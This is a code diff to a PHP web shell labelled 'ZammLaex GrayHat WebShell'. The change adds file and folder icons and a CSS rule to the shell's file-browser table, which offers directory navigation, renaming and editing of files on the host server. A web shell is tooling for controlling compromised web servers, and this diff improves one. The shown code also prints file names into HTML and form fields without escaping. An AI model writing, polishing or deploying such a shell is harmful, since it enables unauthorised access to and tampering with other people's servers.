@@ -149,6 +149,7 @@ button, .btn {
     font-size:14px;
 }
 .grid2 {display:grid;grid-template-columns: 1fr 1fr;gap:10px;margin-top:10px;}
+img { vertical-align: middle; }
 </style></head><body>";
 
 echo "<h2>ZammLaex GrayHat WebShell</h2>";
@@ -185,9 +186,18 @@ $n = 0;
 foreach (array_merge($dirs, $files) as $f) {
     $p = $cwd.'/'.$f;
     $size = is_file($p)?filesize($p):'-';
+
+    $icon = is_dir($p)
+        ? "<img src='https://img.icons8.com/fluency/24/folder-invoices.png' style='margin-right:5px;'>"
+        : "<img src='https://img.icons8.com/fluency/24/document.png' style='margin-right:5px;'>";
+
+    $name = is_dir($p)
+        ? "<a href='?path=".urlencode($p)."' style='color:#fff;'>$icon$f</a>"
+        : "$icon$f";
+
     echo "<tr>";
     echo "<td><input type='checkbox' name='sel[]' value='".htmlspecialchars($f)."'></td>";
-    echo "<td>".(is_dir($p) ? "<a href='?path=".urlencode($p)."' style='color:#fff;'>$f</a>" : $f)."</td>";
+    echo "<td>$name</td>";
     echo "<td>$size</td><td>";
     echo "<form method='POST'><input type='hidden' name='rename' value='$f'><input type='text' name='rename_to' value='$f' size='10'><button class='btn'>Rename</button></form> ";
     if (is_file($p)) echo "<a href='?path=$cwd&edit=$f' class='btn'>Edit</a> ";
